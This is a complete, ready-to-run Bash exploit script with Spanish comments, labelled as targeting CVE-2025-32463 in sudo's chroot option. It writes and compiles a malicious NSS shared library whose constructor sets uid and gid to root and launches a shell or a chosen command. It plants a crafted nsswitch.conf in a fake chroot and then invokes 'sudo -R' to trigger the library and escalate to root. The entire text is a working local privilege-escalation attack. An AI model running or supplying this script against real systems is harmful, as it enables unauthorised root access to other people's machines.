#!/bin/bash
# exploit.sh - Exploit para CVE-2025-32463
# Referencia: Rich Mirch (Stratascale CRU)

# Configuración de colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Funciones de mensajes
error() { echo -e "${RED}✘ Error: $1${NC}" >&2; exit 1; }
success() { echo -e "${GREEN}✓ $1${NC}"; }
info() { echo -e "${CYAN}➜ $1${NC}"; }

echo -e "\n${YELLOW}=== Exploit para CVE-2025-32463 ===${NC}"
info "Iniciando proceso de explotación..."

# Crear entorno de trabajo temporal
STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
info "Directorio temporal: ${STAGE}"
cd "${STAGE}" || error "Fallo al acceder al directorio temporal"

# Determinar comando a ejecutar
if [[ $# -gt 0 ]]; then
    CMD="$*"
    info "Comando especificado: ${YELLOW}${CMD}${NC}"
else
    CMD="/bin/bash"
    info "Usando shell interactiva por defecto"
fi

# Preparar comando para inyección
info "Preparando payload..."
CMD_C_ESCAPED=$(printf '%s' "${CMD}" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

# Generar código de la biblioteca
info "Generando biblioteca maliciosa..."
cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) 
void payload(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

# Configurar entorno de explotación
info "Configurando entorno..."
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc/ 2>/dev/null || info "Advertencia: No se copió /etc/group"

# Compilar componente crítico
info "Compilando biblioteca..."
if gcc -shared -fPIC -Wl,-init,payload -o libnss_/woot1337.so.2 woot1337.c; then
    success "Biblioteca compilada con éxito"
else
    error "Fallo en la compilación - Verifique gcc"
fi

# Ejecutar la explotación
echo -e "\n${GREEN}■ Iniciando explotación ■${NC}"
info "Ejecutando: sudo -R woot woot"
sudo -R woot woot

# Limpieza final
info "Realizando limpieza..."
rm -rf "${STAGE}"
success "Proceso completado - Recursos liberados"
